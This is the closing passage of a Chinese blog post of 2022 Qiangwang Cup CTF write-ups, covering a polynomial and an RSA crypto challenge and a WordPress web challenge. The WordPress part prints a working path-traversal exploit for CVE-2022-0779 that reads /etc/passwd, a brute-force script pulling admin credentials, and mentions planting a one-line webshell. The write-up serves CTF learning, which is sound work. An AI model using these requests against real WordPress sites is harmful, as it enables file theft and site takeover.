&#x27;</span>)</span><br><span class="line">            self.r = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            tmp = self.r</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;a(x) = &#x27;</span>)</span><br><span class="line">            self.a = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            self.sh.recvuntil(<span class="string">b&#x27;c(x) = &#x27;</span>)</span><br><span class="line">            self.c = self.sh.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">            self.r = self.Poly2N(self.r)</span><br><span class="line">            self.a = self.Poly2N(self.a)</span><br><span class="line">            self.c = self.Poly2N(self.c)</span><br><span class="line">            b = self.check(self.a, self.c, tmp)</span><br><span class="line">            <span class="keyword">if</span> b:</span><br><span class="line">                self.sh.sendlineafter(<span class="string">b&#x27;&gt; b(x) = &#x27;</span>, <span class="built_in">str</span>(PP(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])).encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof_of_work()</span><br><span class="line">        self.solve_rac()</span><br><span class="line">        self.sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br><span class="line"><span class="comment"># flag&#123;f2887f56-0114-49c0-a0c6-663f164ef84a&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h4><ul>
<li><p>题目描述</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> falg</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> s:s + <span class="built_in">bytes</span>([(<span class="built_in">len</span>(s)-<span class="number">1</span>)%<span class="number">16</span>+<span class="number">1</span>]*((<span class="built_in">len</span>(s)-<span class="number">1</span>)%<span class="number">16</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">n = getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span> * getPrime(<span class="number">128</span>)**<span class="number">2</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">flag = pad(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) &gt;= <span class="number">48</span>)</span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line"><span class="string">e = 3</span></span><br><span class="line"><span class="string">c = 945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>4个因子，因为都是128位，yafu直接分解$\sqrt{n}$</p>
<p>跑到一半报错了（心态崩），看日志差不多一个小时的时间分解出来一个因子</p>
<p><img src="https://img-blog.csdnimg.cn/1f0e7c4234314af7884e51a136a61164.png" alt="image-20220730204034366"></p>
<p>之后重新下载了一个yafu就可以继续跑了</p>
<p><img src="https://img-blog.csdnimg.cn/0df9ba80ac344ad498a5ddbbd620dd6f.png" alt="image-20220730222756505"></p>
<p>最后$e=3$，$\varphi$有公因子9分别来自两个因子；由于$m$比较小，直接选用另外两个因子做模数就好了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">n1 = iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">r1, r2, r3, r4 = [<span class="number">225933944608558304529179430753170813347</span>, <span class="number">218566259296037866647273372633238739089</span>, <span class="number">223213222467584072959434495118689164399</span>, <span class="number">260594583349478633632570848336184053653</span>]</span><br><span class="line"></span><br><span class="line">phi = r3 * r4 * (r3 - <span class="number">1</span>) * (r4 - <span class="number">1</span>)</span><br><span class="line">new_n = (r3 * r4) ** <span class="number">2</span></span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = long_to_bytes(<span class="built_in">pow</span>(c, d, new_n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="WP-UM"><a href="#WP-UM" class="headerlink" title="WP-UM"></a>WP-UM</h4><ul>
<li><strong>CVE-2022-0779</strong></li>
</ul>
<p>因为存在meta-user插件，并且版本为2.4.3</p>
<p>payload:</p>
<p><a target="_blank" rel="noopener" href="https://www.zilyun.com/23036.html">WordPress User Meta Lite Pro 2.4.3 Path遍历漏洞CVE-2022-0779-子云社区 (zilyun.com)</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/admin-ajax.php HTTP/1.1<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept: */*<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept-Language: en-GB,en;q=0.5<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Accept-Encoding: gzip, deflate<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">X-Requested-With: XMLHttpRequest<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Content-Length: 158<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Connection: close<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Cookie: [subscriber+]<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">field_name=test&amp;filepath=/../../../../../../../../etc/passwd&amp;field_id=um_field_4&amp;form_key=Upload&amp;action=um_show_uploaded_file&amp;pf_nonce=4286c1c56a&amp;is_ajax=true</span><br></pre></td></tr></table></figure>

<p>而给我们的目录中发现存在username和password目录，而通过题目的提示说明就是管理员的账户，那么直接利用这个cve爆破管理员密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAdmin</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;&lt;http://eci-2ze10x6989phb1g6riek.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class="line">            data = &#123;<span class="string">&#x27;field_name&#x27;</span>: <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;filepath&#x27;</span>: <span class="string">&#x27;/../../../../../../password/&#123;&#125;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), x), <span class="string">&#x27;field_id&#x27;</span>: <span class="string">&#x27;um_field_4&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;form_key&#x27;</span>: <span class="string">&#x27;Upload&#x27;</span>, <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;um_show_uploaded_file&#x27;</span>, <span class="string">&#x27;pf_nonce&#x27;</span>: <span class="string">&#x27;ffe681c469&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;is_ajax&#x27;</span>: <span class="string">&#x27;true&#x27;</span>&#125;</span><br><span class="line">            cookie = &#123;&#125;</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;umRemoveFile&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i)+x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">getAdmin()</span><br><span class="line"></span><br><span class="line"><span class="comment"># MaoGePaMao</span></span><br><span class="line"><span class="comment"># MaoGeYaoQiFeiLa</span></span><br></pre></td></tr></table></figure>

<p>直接登录，在插件那里存在插件文件编辑，直接在user-meta.php中写入一句话木马</p>
<p>直接访问首页，执行成功，flag在user目录下</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Ameuu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86WP/">http://example.com/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86WP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Ameuu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/">强网杯</a></div><div class="post_share"><div class="social-share" data-image="/img/cover3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/07/28/%E7%A2%8E%E7%A2%8E%E5%BF%B5ing/"><img class="next-cover" src="/img/cover1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">碎碎念ing</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/NANAKI.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ameuu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ameuu"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TeamGipsy%E6%88%98%E9%98%9F-WRITEUP"><span class="toc-number">1.</span> <span class="toc-text">TeamGipsy战队 WRITEUP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">一、战队信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="toc-number">1.2.</span> <span class="toc-text">二、解题情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">三、解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">1.3.1.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">问卷调查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.3.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#myJWT"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">myJWT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Factor"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">Factor</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">1.3.3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#houseofcat"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">houseofcat</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#flag-%E5%80%BC"><span class="toc-number">1.3.3.1.0.1.</span> <span class="toc-text">flag 值</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RE"><span class="toc-number">1.3.4.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GameMaster"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">GameMaster</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.3.5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#easyweb"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">easyweb</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B"><span class="toc-number">1.3.6.</span> <span class="toc-text">强网先锋</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rcefile"><span class="toc-number">1.3.6.1.</span> <span class="toc-text">rcefile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#polydiv"><span class="toc-number">1.3.6.2.</span> <span class="toc-text">polydiv</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ASR"><span class="toc-number">1.3.6.3.</span> <span class="toc-text">ASR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WP-UM"><span class="toc-number">1.3.6.4.</span> <span class="toc-text">WP-UM</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86WP/" title="强网杯部分WP">强网杯部分WP</a><time datetime="2022-08-01T09:32:04.770Z" title="发表于 2022-08-01 17:32:04">2022-08-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/28/%E7%A2%8E%E7%A2%8E%E5%BF%B5ing/" title="碎碎念ing">碎碎念ing</a><time datetime="2022-07-28T06:07:15.000Z" title="发表于 2022-07-28 14:07:15">2022-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/27/Java%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E2%85%A5/" title="Java初步学习Ⅵ">Java初步学习Ⅵ</a><time datetime="2022-07-27T12:33:10.000Z" title="发表于 2022-07-27 20:33:10">2022-07-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/25/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B/" title="DASCTF2022 07赋能赛">DASCTF2022 07赋能赛</a><time datetime="2022-07-25T07:05:36.000Z" title="发表于 2022-07-25 15:05:36">2022-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/22/JavaDeserializeLabs/" title="JavaDeserializeLabs">JavaDeserializeLabs</a><time datetime="2022-07-22T12:04:51.000Z" title="发表于 2022-07-22 20:04:51">2022-07-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Ameuu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>